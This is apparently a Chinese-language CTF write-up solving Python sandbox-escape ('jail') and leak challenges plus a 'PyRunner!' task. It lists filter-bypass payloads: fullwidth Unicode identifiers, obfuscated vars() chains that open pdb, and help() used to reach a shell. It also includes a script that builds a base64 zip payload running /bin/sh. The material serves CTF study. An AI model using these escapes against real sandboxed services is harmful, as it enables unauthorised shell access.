# Jail Level 1-6 & Leak Level 1-2 & PyRunner!

## Jail Level 1

`breakpoint()`

## Jail Level 2

参考 https://zhuanlan.zhihu.com/p/578986988 。由于开启了socat，直接help()函数后在控制台打!sh即可getshell

## Jail Level 3

快乐非ascii字符通杀：`ｂｒｅａｋｐｏｉｎｔ()`（可以绕过过滤但是可以正常执行）

## Jail Level 4

记得题目是个python2，python 2.7的input相当于python3的eval(input())。`open('flag').read()`

## Jail Level 5

`vars(vars()[(*vars(),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]])[(*vars(vars()[(*vars(),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]]),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]]()`

不是我自己想出来的，是在其他CTF里见到的一个逆天payload，当时记下来了。作用是开启pdb

## Jail Level 6

`vars(vars()[[*vars()][-9]])[[*vars(vars()[[*vars()][-9]])][12]]()`

同样是在其他CTF里见到的，参考 https://xhacka.github.io/ctf/2023/amateursctf/censorship 。不过偏移有些不一样，需要自己找

## PyRunner!

完全就是JustCTF 2023的原题(简化了很多)。但是那题有非预期，这里给它修好了。直接在google就能搜到： https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#pyplugins 。预期解为 https://gist.github.com/lebr0nli/0837d0c3822c76586fa6582e891a1514

```py
import tempfile
import zipfile
import base64
def create_zip_payload() -> bytes:
    file_name = "__main__.py"
    file_content = b'import os;os.system("/bin/sh")'
    with tempfile.TemporaryFile(suffix=".zip") as f:
        with zipfile.ZipFile(f, "w") as z:
            z.writestr(file_name, file_content)
        f.seek(0)
        return f.read()
temp=f"pwn={create_zip_payload()!r}"
print(base64.b64encode(temp.encode()))
```

## Leak Level 0 & Leak Level 2

`hｅlp()`。用特殊字体（看我就说通杀）绕过滤。然后`__main__`获取真正的admin key

## Leak Level 1

`vars()`